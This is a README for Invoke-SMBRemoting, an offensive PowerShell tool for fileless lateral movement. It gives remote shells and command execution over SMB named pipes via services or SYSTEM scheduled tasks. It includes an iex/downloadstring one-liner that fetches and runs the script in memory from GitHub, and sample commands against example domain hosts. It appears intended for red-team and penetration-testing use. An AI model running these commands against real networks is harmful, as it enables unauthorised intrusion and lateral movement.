# Invoke-SMBRemoting
Interactive Shell and Command Execution over Named-Pipes (SMB) for Fileless lateral movement.

Invoke-SMBRemoting enables remote command execution or interactive shell access over SMB named pipes through service creation/modification or scheduled tasks.

The tool supports specifying commands or establishing a persistent shell connection, and requires administrative rights on the target.

First, load the script in memory:

```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-SMBRemoting/main/Invoke-SMBRemoting.ps1')
```

### Interactive Shell
```
Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local"
```
```
Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService
```
```
Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -Verbose
```
```
Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -ServiceName SensorService -Verbose
```

### Command Execution
```
Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all"
```
```
Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all" -PipeName Something -ServiceName RandomService
```
```
Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all" -ModifyService
```
```
Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all" -ModifyService -ServiceName SensorService -Verbose
```

![image](https://github.com/Leo4j/Invoke-SMBRemoting/assets/61951374/645eaffe-e3d3-4428-b7a4-14bf95f5ddce)

## Scheduled Tasks

Invoke-SMBRemoting can now leverage Scheduled Tasks to enable command execution or interactive shell access over Named Pipes (SMB) on a remote host.

On the remote host, created tasks will run as SYSTEM by default, but you can run them in the current user context by using the -AsUser switch

```
Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -AsTask
```
```
Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -AsTask -Command "whoami /all"
```
```
Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -AsTask -AsUser
```
```
Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -AsTask -AsUser -Command "whoami /all"
```
![image](https://github.com/user-attachments/assets/be729cb3-3de2-47d4-af7b-f283930a2211)
